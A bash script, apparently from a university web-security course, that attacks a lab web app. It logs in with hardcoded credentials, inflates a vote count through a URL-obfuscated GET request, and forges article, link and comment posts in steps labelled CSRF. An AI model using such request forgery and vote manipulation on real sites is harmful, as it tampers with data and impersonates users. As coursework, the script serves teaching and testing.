#!/bin/bash

if [ $# -ne 2 ]; then
	PREFIX="ugster21.student.cs.uwaterloo.ca/sdsuo"
else
	IP=$1
	PORT=$2
	PREFIX=$IP:$PORT
fi

echo "=====[Setup]====="
POST_PAGE="$PREFIX/post.php"
HOME_PAGE="$PREFIX/index.php"
VIEW_PAGE="$PREFIX/view.php"
echo "Using Login Page at: $POST_PAGE"
echo "Using Home Page at: $HOME_PAGE"
echo "Using View Page at: $VIEW_PAGE"

echo "=====[Login]====="
USERNAME="alice"
PASSWORD="passw0rd"
echo "Using username: $USERNAME"
echo "Using password: $PASSWORD"
echo "Logging in with POST request"

curl \
-c "cookie.txt" \
-d "form=login" \
-d "submit=Login" \
-d "username=$USERNAME" \
-d "password=$PASSWORD" \
$POST_PAGE
echo

echo "=====[Attack 1: Voting with Obfuscated GET Request]====="
ATTACK_LINK="$PREFIX/vote.php?id=1&vote=1000000"
OBFUSCATED_LINK="$PREFIX/%76%6F%74%65.%70%68%70?%69%64=%31&%76%6F%74%65=%31%30%30%30%30%30%30"

echo "Constructing GET request:  $ATTACK_LINK"
echo "Executing obfuscated GET request: $OBFUSCATED_LINK"
curl -b "cookie.txt" $OBFUSCATED_LINK

echo "Showing post page with modified upvotes"
curl -b "cookie.txt" $VIEW_PAGE?id=1

echo "=====[Attack 2: Creating Article Post with POST Request]====="
ARTICLE_TYPE=1
ARTICLE_CONTENT="Article post created with CSRF"
ARTICLE_TITLE="Article post created with CSRF"

echo "Using article title: $ARTICLE_TITLE"
echo "Using article content: $ARTICLE_CONTENT"

curl \
-b "cookie.txt" \
-d "form=content" \
-d "submit=Post" \
-d "type=$ARTICLE_TYPE" \
--data-urlencode "title=$ARTICLE_TITLE" \
--data-urlencode "content=$ARTICLE_CONTENT" \
$POST_PAGE

echo "Showing index page with new article post"
curl -b "cookie.txt" $HOME_PAGE

echo "=====[Attack 3: Creating Link Post with POST Request]====="
LINK_TYPE=2
LINK_TITLE="Link post created with CSRF"
LINK_CONTENT="Link post created with CSRF"

echo "Using link title: $LINK_TITLE"
echo "Using link content: $LINK_CONTENT"

curl \
-b "cookie.txt" \
-d "form=content" \
-d "submit=Post" \
-d "type=$LINK_TYPE" \
--data-urlencode "title=$LINK_TITLE" \
--data-urlencode "content=$LINK_CONTENT" \
$POST_PAGE

echo "Showing index page with new link post"
curl -b "cookie.txt" $HOME_PAGE

echo "=====[Attack 4: Creating Comment with POST Request]====="
COMMENT_COMMENT="Comment created with CSRF"
COMMENT_PARENT=1
COMMENT_UID=7

echo "Using user id: $COMMENT_UID"
echo "Using comment parent: $COMMENT_PARENT"
echo "Using comment: $COMMENT_COMMENT"

curl \
-b "cookie.txt" \
-d "form=comment" \
-d "submit=Post" \
-d "parent=$COMMENT_PARENT" \
-d "uid=$COMMENT_UID" \
--data-urlencode "comment=$COMMENT_COMMENT" \
$POST_PAGE

echo "Showing index page with new comment"
curl -b "cookie.txt" $HOME_PAGE
